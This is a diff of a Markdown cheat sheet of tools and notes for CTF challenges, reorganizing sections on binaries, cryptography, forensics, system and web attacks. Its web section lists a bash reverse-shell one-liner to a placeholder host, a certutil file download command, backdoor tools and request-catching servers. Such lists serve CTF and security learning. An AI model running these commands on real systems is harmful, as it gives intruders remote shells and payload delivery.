@@ -33,66 +33,19 @@ This is a payload collection and references for CTF challenges.
 
 
 ## Binary
-- Running Environ
-  - Headers (mingw-w64)
-    - `$ sudo apt install mingw-w64`
-      > /usr/x86_64-w64-mingw32/include
-      > 
-      > /usr/i686-w64-mingw32/include
-  - Library
-    - `$ patchelf --set-interpreter ./libc/ld-linux.so.2 --set-rpath ./libc/ <bin>`
-    - `$ LD_PRELOAD=<lib> <bin>`
-- Debugger
-  - IDA pro
-    - Command
-      | Key                                                  | Comment                |
-      |:-----------------------------------------------------|:-----------------------|
-      | `<S-F1>`                                             | set variable structure |
-      | `<S-F12>`                                            | string list            |
-      | `r` / `h`                                            | encode                 |
-      | `x`                                                  | xrefs                  |
-      | `y`                                                  | type declaration       |
-      | `<C-f>`                                              | search                 |
-      | `<R>` > reset pointer type > create  new struct type |                        |
-    - [IDA Skins](https://github.com/zyantific/IDASkins)
-  - Ghidra
-  - Windbg preview
-  - x64dbg
-    | Key         | Comment      |
-    |:------------|:-------------|
-    | `<space>`   | modify code  |
-    | `<C-p>`     | patch binary |
-    | `<R>` > `s` | search       |
-  - gdb
-    - command
-      | Cmd    | Comment |
-      |:-------|:--------|
-      | watch  |         |
-      | rwatch |         |
-      | awatch |         |
-      | x/[N][g,w,h,b]x | |
-    - plugins
-      - peda
-      - gef
-      - pwndbg
-      - pwngdb
-  - CheatEngine72
-- Decompiler
-  - [Decompiler Explorer Online](https://dogbolt.org/)
-  - [Compiler Explorer Online](https://godbolt.org/)
-  - jad
-  - uncompyle6
-  - [dnSpy](https://github.com/dnSpy/dnSpy) (.Net Framwork)
-  - Telerik/JustAssembly
-- Useful Linux Command
-  | Cmd                     | Comment        |
-  |:------------------------|:---------------|
-  | `$ readelf -S <binary>` | section header |
-  | `$ objdump -R <binary>` | got table      |
-  | `$ objdump -d <binary>` | plt table      |
-  | `$ c++filt`             |                |
-  | `$ hexer`               |                |
-  | `$ hexcurse`            |                |
+
+
+### Tool
+
+
+#### File Analyzer
+- General
+  - `$ file`
+  - `$ c++filt`
+- ELF
+  - `$ readelf -S <binary>`
+  - `$ objdump -R <binary>`
+  - `$ objdump -d <binary>`
 - PE Viewer
   - reshacker
   - CFF Explorer (ExplorerSuite)
@@ -101,21 +54,80 @@ This is a payload collection and references for CTF challenges.
   - PE-bear
   - PEview
   - 010 editor
+- Pack Detector
+  - PEiD
+  - DIE (detect it easy)
+    - identify shell and other info
+
+
+#### Decompiler
+- [Decompiler Explorer Online](https://dogbolt.org/)
+- [Compiler Explorer Online](https://godbolt.org/)
+- jad
+- uncompyle6
+- [dnSpy](https://github.com/dnSpy/dnSpy) (.Net Framwork)
+- Telerik/JustAssembly
+
+
+#### Debugger
+- IDA pro
+  - Command
+    | Key                                                  | Comment                |
+    |:-----------------------------------------------------|:-----------------------|
+    | `<S-F1>`                                             | set variable structure |
+    | `<S-F12>`                                            | string list            |
+    | `r` / `h`                                            | encode                 |
+    | `x`                                                  | xrefs                  |
+    | `y`                                                  | type declaration       |
+    | `<C-f>`                                              | search                 |
+    | `<R>` > reset pointer type > create  new struct type |                        |
+  - [IDA Skins](https://github.com/zyantific/IDASkins)
+- Ghidra
+- Windbg preview
+- x64dbg
+  | Key         | Comment      |
+  |:------------|:-------------|
+  | `<space>`   | modify code  |
+  | `<C-p>`     | patch binary |
+  | `<R>` > `s` | search       |
+- gdb
+  - command
+    | Cmd    | Comment |
+    |:-------|:--------|
+    | watch  |         |
+    | rwatch |         |
+    | awatch |         |
+    | x/[N][g,w,h,b]x | |
+  - plugins
+    - peda
+    - gef
+    - pwndbg
+    - pwngdb
+- CheatEngine72
+
+
+#### Running Environ
+- x86 binary on x64 OS
+  - `$ sudo apt install mingw-w64`
+    - `/usr/x86_64-w64-mingw32/include`
+    - `/usr/i686-w64-mingw32/include`
+- Library
+  - `$ patchelf --set-interpreter ./libc/ld-linux.so.2 --set-rpath ./libc/ <bin>`
+  - `$ env LD_PRELOAD=<lib> <bin>`
 - API Hook
   - [Microsoft Research Detours Package](https://github.com/microsoft/Detours)
   - pintool
   - strace / ltrace
-- Pack Detector
-  - PEiD
-  - DIE (detect it easy)
-    * identify shell and other info
-- Payload
-  - pwntools
-  - one\_gadget
-  - angr
+
+
+#### Payload
+- pwntools
+- one\_gadget
+- angr
 
 
 ### Background
+
 
 #### Calling Convention
 - Compare
@@ -200,9 +212,17 @@ This is a payload collection and references for CTF challenges.
 
 ### Buffer Over Flow
 
+
 ### Fuzzing
 
+
 ## Crypto
+
+
+### Tool
+
+
+#### Decrypt
 - pyCryptodome
 - Crypto.Util.number
   | Function | Comment         |
@@ -211,84 +231,14 @@ This is a payload collection and references for CTF challenges.
 - Sage
   - [sagemath](https://sagecell.sagemath.org/)
   - [CoCalc](https://cocalc.com/)
-  - `apt install sagemath`
-- Password Brute Force
-  - hashcat
-  - hydra
-    - crunch
 
 
-### Background
+#### Brute Force
+- hashcat
+- hydra
+  - crunch
+- unt-wister
 
-#### Cryptanalysis
-- Kerckhoff's Principle
-- Classical Cryptanalysis
-  - Mathmatical Analysis
-  - Brute-Force Attacks
-    - Substitution Cipher
-      > Caesar Cipher
-
-      - Exhaustive Key Search
-      - Letter Frequency Analysis
-- Implementation Attacks
-- Social Engineering
-
-#### Symmetric Cipher
-- Stream Cipher
-  > encrypt bits individually
-  > 
-  > usually small and fast  
-  > 
-  > security dependes entirely on key stream (sync, async), which is random and reproducible
-  
-  - vulnerable to reused key attack
-
-    ```
-    E(A) = A xor C
-    E(B) = B xor C
-    E(A) xor E(B) = A xor B
-    ```
-
-  - key stream generator
-    > the key stream generator works like a Pseudorandom Number Generator (RNG),
-    > which generate sequences from initial seed (key) value
-    > 
-    > ![](<https://latex.codecogs.com/gif.latex?s_0 = seed, s_{i+1} = f(s_i, s_{i-1}, ..., s_{i-t})>)
-  
-    - Linear Congruential Generator (LCG)
-    
-      ![](<https://latex.codecogs.com/gif.latex?S_0 = seed, S_{i+1} = AS_i + B\ mod\ m>)  
-    
-      Assume
-      - unknown A, B and S0 as key
-      - m = 2^32
-      - S1, S2, S3 are known  
-    
-      Solving  
-      - ![](<https://latex.codecogs.com/gif.latex?S_2 = AS_1 + B\ (mod\ m)>)
-      - ![](<https://latex.codecogs.com/gif.latex?S_3 = AS_2 + B\ (mod\ m)>)
-    
-      Answer
-      - ![](<https://latex.codecogs.com/gif.latex?A = (S_2 - S_3) \times inverse(S_1 - S_2, m)\ (mod\ m)>)
-      - ![](<https://latex.codecogs.com/gif.latex?B = (S_2 - AS_1)\ (mod\ m)>)
-    
-    - MT19937
-      > python's default RNG
-
-      - can be recovered by 32x624 consecutive bits
-        - `from randcrack import RandCrack`
-
-    - Lineare Feedback Shift Register (LFSR)
-
-      ![](<https://latex.codecogs.com/gif.latex?S_{i+3} = S_{i+1} \oplus S_{i}>)
-      
-      - Characteristic Polynomial
-        - ![](<https://latex.codecogs.com/gif.latex?P(x) = x^m + p_{m-1}x^{m-1} + ... + p_1x + p_0>)
-
-
-- Block Cipher
-  > - always encrypt a full block (several bits)
-  > - common for internet applications
 
 #### Certificate
 - Generate
@@ -477,22 +427,100 @@ This is a payload collection and references for CTF challenges.
   ```
 
 
+### Background
+
+
+#### Cryptanalysis
+- Kerckhoff's Principle
+- Classical Cryptanalysis
+  - Mathmatical Analysis
+  - Brute-Force Attacks
+    - Substitution Cipher
+      > Caesar Cipher
+
+      - Exhaustive Key Search
+      - Letter Frequency Analysis
+- Implementation Attacks
+- Social Engineering
+
+
+#### Symmetric Cipher
+- Stream Cipher
+  > encrypt bits individually
+  > 
+  > usually small and fast  
+  > 
+  > security dependes entirely on key stream (sync, async), which is random and reproducible
+  
+  - vulnerable to reused key attack
+
+    ```
+    E(A) = A xor C
+    E(B) = B xor C
+    E(A) xor E(B) = A xor B
+    ```
+
+  - key stream generator
+    > the key stream generator works like a Pseudorandom Number Generator (RNG),
+    > which generate sequences from initial seed (key) value
+    > 
+    > ![](<https://latex.codecogs.com/gif.latex?s_0 = seed, s_{i+1} = f(s_i, s_{i-1}, ..., s_{i-t})>)
+  
+    - Linear Congruential Generator (LCG)
+    
+      ![](<https://latex.codecogs.com/gif.latex?S_0 = seed, S_{i+1} = AS_i + B\ mod\ m>)  
+    
+      Assume
+      - unknown A, B and S0 as key
+      - m = 2^32
+      - S1, S2, S3 are known  
+    
+      Solving  
+      - ![](<https://latex.codecogs.com/gif.latex?S_2 = AS_1 + B\ (mod\ m)>)
+      - ![](<https://latex.codecogs.com/gif.latex?S_3 = AS_2 + B\ (mod\ m)>)
+    
+      Answer
+      - ![](<https://latex.codecogs.com/gif.latex?A = (S_2 - S_3) \times inverse(S_1 - S_2, m)\ (mod\ m)>)
+      - ![](<https://latex.codecogs.com/gif.latex?B = (S_2 - AS_1)\ (mod\ m)>)
+    
+    - MT19937
+      > python's default RNG
+
+      - can be recovered by 32x624 consecutive bits
+        - `from randcrack import RandCrack`
+
+    - Lineare Feedback Shift Register (LFSR)
+
+      ![](<https://latex.codecogs.com/gif.latex?S_{i+3} = S_{i+1} \oplus S_{i}>)
+      
+      - Characteristic Polynomial
+        - ![](<https://latex.codecogs.com/gif.latex?P(x) = x^m + p_{m-1}x^{m-1} + ... + p_1x + p_0>)
+
+
+- Block Cipher
+  > - always encrypt a full block (several bits)
+  > - common for internet applications
+
+
 ## Misc
 
-- Binary Forensic
-  - binwalk 
-  - polyfile
-    - `polyfile <file>.pdf --html <file>.html`
-  - [file signature](https://filesignatures.net/)
-    > `47 49 46 38` GIF8
-    >
-    > `89 50 4e 47` .PNG
-  - `qpdf --qdf --object-streams=disable <infile> <outfile>`
-  - [Stego](https://0xrick.github.io/lists/stego/)
-    - zsteg
-    - stegsolve.jar
-  - Recover
-    - unt-wister
+
+### Tool
+
+
+#### Binary Forensic
+- binwalk 
+- polyfile
+  - `polyfile <file>.pdf --html <file>.html`
+- [file signature](https://filesignatures.net/)
+  > `47 49 46 38` GIF8
+  >
+  > `89 50 4e 47` .PNG
+- [Stego](https://0xrick.github.io/lists/stego/)
+  - zsteg
+  - stegsolve.jar
+- `qpdf --qdf --object-streams=disable <infile> <outfile>`
+
 
 ### QRcode
 - Content
@@ -500,30 +528,41 @@ This is a payload collection and references for CTF challenges.
 
 
 ## System
-- Malware Scanner
-  - [Microsoft Safety Scanner](https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/safety-scanner-download)
-  - [Trend Micro Anti-Threat Toolkit](https://www.trendmicro.com/zh_tw/business/capabilities/solutions-for/ransomware/free-tools.html)
-  - [VirusTotal](https://www.virustotal.com/gui/)
-  - [nodistribute](https://nodistribute.com/)
-- System Forensic
-  - wireshark
-  - autopsy
-  - sleuthkit
-  - OSForensic
-  - regsnap
-  - Process Monitor (SysinternalsSuite)
-  - Porcess Explorer (SysinternalsSuite)
-  - WinObj (SysinternalsSuite)
-  - Task Explorer (ExplorerSuite)
-  - Driver List (ExplorerSuite)
-  - FTK Imager
-- Vulnerability Assessment
-  - OpenVAS
-  - metasploit
-  - nmap
-  - cobaltstrike
+
+
+### Tool
+
+
+#### Malware Scanner
+- [Microsoft Safety Scanner](https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/safety-scanner-download)
+- [Trend Micro Anti-Threat Toolkit](https://www.trendmicro.com/zh_tw/business/capabilities/solutions-for/ransomware/free-tools.html)
+- [VirusTotal](https://www.virustotal.com/gui/)
+- [nodistribute](https://nodistribute.com/)
+
+
+#### System Forensic
+- wireshark
+- autopsy
+- sleuthkit
+- OSForensic
+- regsnap
+- Process Monitor (SysinternalsSuite)
+- Porcess Explorer (SysinternalsSuite)
+- WinObj (SysinternalsSuite)
+- Task Explorer (ExplorerSuite)
+- Driver List (ExplorerSuite)
+- FTK Imager
+
+
+#### Vulnerability Assessment
+- OpenVAS
+- metasploit
+- nmap
+- cobaltstrike
+
 
 ### Background
+
 
 #### Windows
 > https://lolbas-project.github.io/
@@ -610,6 +649,9 @@ This is a payload collection and references for CTF challenges.
   - Sysmon
     - [SysmonSimulator](https://rootdse.org/posts/understanding-sysmon-events/)
 
+- minifilter
+- WFP
+
 #### Linix/Unix
 > https://gtfobins.github.io/
 
@@ -649,69 +691,81 @@ This is a payload collection and references for CTF challenges.
 > [Basic concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q?type=slide#/)  
 > [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/index.html)
 > [OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/stable/)
-- Recon
-  - Target
-    - [SHODAN](https://www.shodan.io/)
-      > Search Engine for the Internet of Everything
-    - [Censys](https://search.censys.io/)
-      > Censys helps organizations, individuals, and researchers find and monitor
-      > every server on the Internet to reduce exposure and improve security
-    - Google Hacking
-      - [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
-  - Site Information
-    - maltego
-    - [Netcraft Site Report](https://sitereport.netcraft.com/)
-    - [crt.sh](https://crt.sh/)
-      > Enter an Identity (Domain Name, Organization Name, etc)
-    - [IANA WHOIS Service](https://www.iana.org/whois)
-    - [DomainTools](https://whois.domaintools.com/)
-  - DNS
-    - drill
-    - dig
-    - nslookup
-    - host
-    - dnsenum
-    - knockpy.py
-    - [dnsdumpster](https://dnsdumpster.com/)
-    - [robtex](https://www.robtex.com/)
-      - Subdomains
-  - Crawler
-    - dirb
-    - DirBuster
-    - git-dumper
-    - wfuzz
-      ```bash
-      wfuzz -c -z file,/raft-large-files.txt -hc 404 "${URL}"
-      ```
-    - ffuf
-- Payload
-  - Burpsuit
-  - [Exploit DB](https://www.exploit-db.com/)
-  - c-jwt-cracker
-  - Scanner
-    - sqlmap
-    - xsser
-    - ZAP
-  - Backdoor
-    - weevely
-    - veil
-    - BeEF
-  - Reverse Shell
-    - `/bin/sh -i >& /dev/tcp/<HOST>/<PORT> 0<&1`
-    - [reverse ICMP shell (icmpsh)](https://github.com/bdamele/icmpsh)
-- Connection
-  - `/dev/tcp/<HOST>/<PORT>`
-  - telnet
-  - nc / ncat / socat
-  - certutil.exe -urlcache -f `<url>` `<filename>`
-  - [HTTPie](https://devhints.io/httpie)
-- Public Temp Server
-  - webhook.site
-    - unique URL (https / CORS)
-    - unique email
-  - beeceptor
-  - hookbin.com
-  - requestbin.net
+
+
+### Tool
+
+
+#### Recon
+- Target
+  - [SHODAN](https://www.shodan.io/)
+    > Search Engine for the Internet of Everything
+  - [Censys](https://search.censys.io/)
+    > Censys helps organizations, individuals, and researchers find and monitor
+    > every server on the Internet to reduce exposure and improve security
+  - Google Hacking
+    - [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
+- Site Information
+  - maltego
+  - [Netcraft Site Report](https://sitereport.netcraft.com/)
+  - [crt.sh](https://crt.sh/)
+    > Enter an Identity (Domain Name, Organization Name, etc)
+  - [IANA WHOIS Service](https://www.iana.org/whois)
+  - [DomainTools](https://whois.domaintools.com/)
+- DNS
+  - drill
+  - dig
+  - nslookup
+  - host
+  - dnsenum
+  - knockpy.py
+  - [dnsdumpster](https://dnsdumpster.com/)
+  - [robtex](https://www.robtex.com/)
+    - Subdomains
+- Crawler
+  - dirb
+  - DirBuster
+  - git-dumper
+  - wfuzz
+    ```bash
+    wfuzz -c -z file,/raft-large-files.txt -hc 404 "${URL}"
+    ```
+  - ffuf
+
+
+#### Payload
+- Burpsuit
+- [Exploit DB](https://www.exploit-db.com/)
+- c-jwt-cracker
+- Scanner
+  - sqlmap
+  - xsser
+  - ZAP
+- Backdoor
+  - weevely
+  - veil
+  - BeEF
+- Reverse Shell
+  - `/bin/sh -i >& /dev/tcp/<HOST>/<PORT> 0<&1`
+  - [reverse ICMP shell (icmpsh)](https://github.com/bdamele/icmpsh)
+
+
+#### Connection
+- `/dev/tcp/<HOST>/<PORT>`
+- telnet
+- nc / ncat / socat
+- `$ certutil.exe -urlcache -f <url> <filename>`
+- [HTTPie](https://devhints.io/httpie)
+
+
+#### Public Temp Server
+- webhook.site
+  - unique URL (https / CORS)
+  - unique email
+- beeceptor
+- hookbin.com
+- requestbin.net
+
 
 ### Background
 - [Basics of HTTP](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Basics_of_HTTP)
